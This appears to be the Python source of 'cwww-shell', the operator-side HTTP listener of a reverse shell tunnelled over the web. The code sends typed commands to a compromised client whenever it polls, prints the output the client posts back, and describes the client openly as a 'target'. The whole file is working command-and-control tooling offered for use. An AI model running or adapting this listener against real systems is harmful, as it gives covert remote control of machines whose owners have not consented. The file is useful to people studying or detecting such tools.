"""
MIT License

Copyright (c) 2024 Ivan Nikolskiy

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import sys

from pex.proto.http import HTTPListener

INTRO = """
Welcome to the cwww-shell v1.0 by Ivan Nikolskiy / enty8080

Introduction: Wait for your client to connect, examine it\'s output and then
              type in your commands to execute on client. You\'ll have to
              wait some time. Use ";" for multiple commands.
              Trying to execute interactive commands may give you headache
              so beware. Your target may hang until the daily connect try
              (if set - otherwise you lost).
              You also shouldn\'t try to view binary data too ;-)
              "echo bla >> file", "cat >> file <<- EOF", sed etc. are your
              friends if you don\'t like using vi in a delayed line mode ;-)
              To exit this program on any time without doing harm to either
              server or client just type "quit".
              Now have fun.
"""


def get_method(request):
    print(f'connect from {request.client_address[0]}:{str(request.client_address[1])}\n')

    command = input('$ ')
    if command == 'quit':
        sys.exit(0)

    request.send_status(200)
    request.wfile.write(command.encode())
    print('sent.\n')


def post_method(request):
    print(f'connect from {request.client_address[0]}:{str(request.client_address[1])}\n')

    length = int(request.headers['Content-Length'])
    data = request.rfile.read(length)
    print(data.decode(), end='')
    request.send_status(200)


def main():
    if len(sys.argv) < 3:
        print(f'Usage {sys.argv[0]} <host> <port>')
        return

    l = HTTPListener(sys.argv[1], int(sys.argv[2]), methods={'get': get_method, 'post': post_method})
    l.listen()
    print(INTRO)

    while True:
        print("\nWaiting for connect ... ", end='')
        l.accept()


if __name__ == '__main__':
    main()
